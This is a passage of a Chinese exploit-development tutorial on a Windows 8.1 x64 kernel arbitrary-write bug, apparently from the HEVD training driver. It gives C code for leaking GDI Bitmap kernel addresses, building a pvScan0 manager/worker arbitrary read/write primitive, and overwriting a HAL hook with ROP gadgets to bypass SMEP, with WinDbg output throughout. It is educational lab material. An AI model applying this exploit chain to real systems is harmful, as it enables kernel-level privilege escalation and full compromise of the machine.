    fffff803`20ffe7cc 0f22e0          mov     cr4,rax
    fffff803`20ffe7cf 4883c428        add     rsp,28h
    fffff803`20ffe7d3 c3              ret
让我们再次看看我们在win7利用中如何进行Hook的，我们是直接把`Hal_hook_address`替换为ShellCode的地址
    Trigger_shellcode(Hal_hook_address,(UINT64)&ShellCode);
    NtQueryIntervalProfile(0x1234, &interVal);
我们想要做的是把`Hal_hook_address`先替换为我们的ROP，修改了cr4寄存器之后再执行我们的shellcode，这就需要进行多次读写的操作，显然光靠一个`Trigger_shellcode`是不够的，这里隆重介绍我们的
BITMAP 对象，这个对象在Windows 8.1中可谓是一个必杀技，用好它可以实现任意读和任意写
## BITMAP对象
首先我们需要了解一下这个对象的大致信息，我们直接用`CreateBitmap`函数创建一个对象然后下断点进行观察，函数原型如下
    HBITMAP CreateBitmap(
     _In_ int nWidth,
     _In_ int nHeight,
     _In_ UINT cPlanes,
     _In_ UINT cBitsPerPel,
     _In_ const VOID *lpvBits
    );
我们构造如下代码
    int main()
    {
        HBITMAP hBitmap = CreateBitmap(0x10, 2, 1, 8, NULL);
        __debugbreak();
        return 0;
    }
这里我们需要用`GdiSharedHadnleTable`这个句柄表来泄露我们`hBitmap`的地址，先不用管原理是什么，总之我们现在先找到我们Bitmap的位置，可以看到我们通过一系列操作居然找到了我们的Bitmap，其分配在会话池，大小是0x370
    1: kd> r
    rax=000000007d050040 rbx=00000043e8613860 rcx=00007ffea6a934fa
    rdx=0000000000000000 rsi=0000000000000000 rdi=00000043e8617d50
    rip=00007ff7468c1033 rsp=00000043e858f8c0 rbp=0000000000000000
     r8=00000043e858f8b8  r9=0000000000000000 r10=0000000000000000
    r11=0000000000000246 r12=0000000000000000 r13=0000000000000000
    r14=0000000000000000 r15=0000000000000000
    iopl=0         nv up ei pl zr na po nc
    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
    WWW!main+0x23:
    0033:00007ff7`468c1033 cc              int     3
    1: kd> dt ntdll!_PEB -b GdiSharedHandleTable @$Peb
       +0x0f8 GdiSharedHandleTable : 0x00000043`e8920000 
    1: kd> ? rax&ffff
    Evaluate expression: 64 = 00000000`00000040
    1: kd> ? 0x00000043`e8920000+40*18
    Evaluate expression: 291664692736 = 00000043`e8920600
    1: kd> dq 00000043`e8920600
    00000043`e8920600  fffff901`43c3dca0 40057d05`000008f4
    00000043`e8920610  00000000`00000000 fffff901`400c2ca0
    00000043`e8920620  40050405`00000000 00000000`00000000
    00000043`e8920630  fffff901`43c5ed60 40080508`00000000
    00000043`e8920640  00000000`00000000 fffff901`43d0d000
    00000043`e8920650  40050505`00000000 00000000`00000000
    00000043`e8920660  fffff901`43d0b000 40050305`00000000
    00000043`e8920670  00000000`00000000 fffff901`43cb9d40
    1: kd> !pool fffff901`43c3dca0
    unable to get nt!ExpHeapBackedPoolEnabledState
    Pool page fffff90143c3dca0 region is Paged session pool
     fffff90143c3d000 size:  9f0 previous size:    0  (Allocated)  Gla1
     fffff90143c3d9f0 size:   90 previous size:  9f0  (Allocated)  DCba Process: ffffe00002475080
     fffff90143c3da80 size:   50 previous size:   90  (Free)       Free
     fffff90143c3dad0 size:   a0 previous size:   50  (Allocated)  Usqm
     fffff90143c3db70 size:   30 previous size:   a0  (Allocated)  Uspi Process: ffffe00002b83900
     fffff90143c3dba0 size:   f0 previous size:   30  (Allocated)  Gla8
    *fffff90143c3dc90 size:  370 previous size:   f0  (Allocated) *Gla5
            Pooltag Gla5 : GDITAG_HMGR_LOOKASIDE_SURF_TYPE, Binary : win32k.sys
让我们理一下这个过程，首先从命令中我们知道`GdiSharedHandleTable`是在PEB中，而`GdiSharedHandleTable`本身是一个保存GDI对象的句柄表，其指向的是一个叫`GDICELL64`的结构，其大小是0x18：
    typedef struct{
        PVOID pKernelAddress;
        USHORT wProcessID;
        USHORT wCount;
        USHORT wUpper;
        PVOID wType;
        PVOID64 pUserAddress;
    } GDICELL64;
从上面我们可以看到它可以泄露我们内核中的地址，过程就是先计算出函数返回值(rax)的低4字节作为索引，然后乘上`GDICELL64`的大小0x18，再加上`GdiSharedHandleTable`的地址即可得到我们Bitmap的地址，换成代码实现就是
  * 首先找到我们的TEB
  * 通过TEB找到PEB
  * 再通过PEB找到`GdiSharedHandleTable`句柄表
  * 通过计算获得Bitmap的地址
关键实现代码如下
    DWORD64 getGdiShreadHandleTableAddr()
    {
        DWORD64 tebAddr = (DWORD64)NtCurrentTeb();
        DWORD64 pebAddr = *(PDWORD64)((PUCHAR)tebAddr + 0x60);
        DWORD64 GdiShreadHandleTableAddr = *(PDWORD64)((PUCHAR)pebAddr + 0xf8);
        return GdiShreadHandleTableAddr;
    }
    DWORD64 getBitMapAddr(HBITMAP hBitmap)
    {
        WORD arrayIndex = LOWORD(hBitmap);
        return *(PDWORD64)(getGdiShreadHandleTableAddr() + arrayIndex * 0x18);
    }
让我们来查看一下Bitmap的结构，我们只需要关注重点的位置就行了
    typedef struct{
     BASEOBJECT64 BaseObject; // 0x18bytes
     SURFOBJ64 SurfObj; 
     ....... 
    } SURFACE64
    typedef struct {
     ULONG64 hHmgr; // 8bytes
     ULONG32 ulShareCount; // 4bytes
     WORD cExclusiveLock; // 2bytes
     WORD BaseFlags; // 2bytes
     ULONG64 Tid; // 8bytes
    } BASEOBJECT64;
    typedef struct{
     ULONG64 dhsurf; // 8bytes
     ULONG64 hsurf; // 8bytes
     ULONG64 dhpdev; // 8bytes
     ULONG64 hdev; // 8bytes
     SIZEL sizlBitmap; // 8bytes
     ULONG64 cjBits; // 8bytes
     ULONG64 pvBits; // 8bytes
     ULONG64 pvScan0; // 8bytes
     ULONG32 lDelta; // 4bytes
     ULONG32 iUniq; // 4bytes
     ULONG32 iBitmapFormat; // 4bytes
     USHORT iType; // 2bytes
     USHORT fjBitmap; // 2bytes
    } SURFOBJ64
这里我借鉴图片来说明，我们关注的点就只有一个`pvScan0`结构，它的偏移是 +0x50 处，可以发现它指向我们的`Pixel
Data`，这个结构就是我们`CreateBitmap`函数传入的第五个参数，也就是说我们传入aaaa，那么pVscan0指向地址的内容就是aaaa
## 任意读写
我们刚才分析了那么多，说到底都是为了一个目的 =>
任意读任意写，那么如何才能任意读和写呢？这里我再介绍两个比较重要的函数`SetBitmapBits`和`GetBitmapBits`其原型如下
    LONG SetBitmapBits(
      HBITMAP    hbm,
      DWORD      cb,
      const VOID *pvBits
    );
    LONG GetBitmapBits(
      HBITMAP hbit,
      LONG    cb,
      LPVOID  lpvBits
    );
这两个函数的作用是向pvScan0指向的地址写(读)cb
byte大小的数据，说到这里貌似有一点任意读写的感觉了，光靠一个pvScan0是肯定不能任意读写的，所以这里我们考虑使用两个pvScan0，我们把一个pvScan0指向另外一个pvScan0，我们有`TriggerArbitraryOverwrite`函数可以实现将一个pvScan0指向另一个pvScan0，然后我们再调用`SetBitmapBits`和`GetBitmapBits`函数岂不是就可以进行任意读写了，我们用图片说明：
我们任意读写的代码构造如下，read函数实现将whereRead的内容读到whatValue的位置，write函数实现将whatValue的内容写入whereWrite的位置：
    VOID readOOB(DWORD64 whereRead, LPVOID whatValue, int len)
    {
        SetBitmapBits(hManagerBitmap, len, &whereRead);
        GetBitmapBits(hWorkerBitmap, len, whatValue);   // read
    }
    VOID writeOOB(DWORD64 whereWrite, LPVOID whatValue, int len)
    {
        SetBitmapBits(hManagerBitmap, len, &whereWrite);
        SetBitmapBits(hWorkerBitmap, len, &whatValue);  // write
    }
让我们平复一下激动的心情，我们现在有了任意读和写的机会了，我们只需要将我们的ROPgadgets写入我们需要Hook的位置，然后调用问题函数执行shellcode就行了，这里我们需要注意的是，我们还需要调整调整堆栈的一些信息，不然很容易就蓝屏了，这里我们进行三次读写操作
    readOOB(Hal_hook_address, &lpRealHooAddress, sizeof(LPVOID));           // 保存Hook地址
    writeOOB(Hal_hook_address, (LPVOID)ROPgadgets, sizeof(DWORD64));        // 写入ROPgadgets
    //调用问题函数
    writeOOB(Hal_hook_address, (LPVOID)lpRealHooAddress, sizeof(DWORD64));   // 还原Hook地址,不然会蓝屏
## 整合思路
我们最后整合一下思路
  * 初始化句柄等结构
  * 内核中构造放置我们的shellcode
  * 申请两个Bitmap并泄露Bitmap中的pvScan0
  * 调用`TriggerArbitraryOverwrite`函数将一个pvScan0指向另一个pvScan0
  * 两次读写实现写入ROPgadgets
  * 调用`NtQueryIntervalProfile`问题函数
  * 一次写入操作实现还原Hook地址的内容
最后整合一下代码即可实现利用，整体代码和验证结果参考 => [这里](https://github.com/ThunderJie/Write-What-Where)
# 0x03：后记
上篇就到这里结束了，win8.1的坑比较多，和win7比起来差距有点大，需要细心调试，下篇我准备分享在win10 x64
1511-1607下的利用，win10下的利用更加新奇，更往后的版本我就简单说明一下自己对利用的一些猜想，以后再来实践
参考资料：
[+]
SMEP原理及绕过：
[+] ROP的选择：
[+] Bitmap结构出处：
[+] wjllz师傅的博客：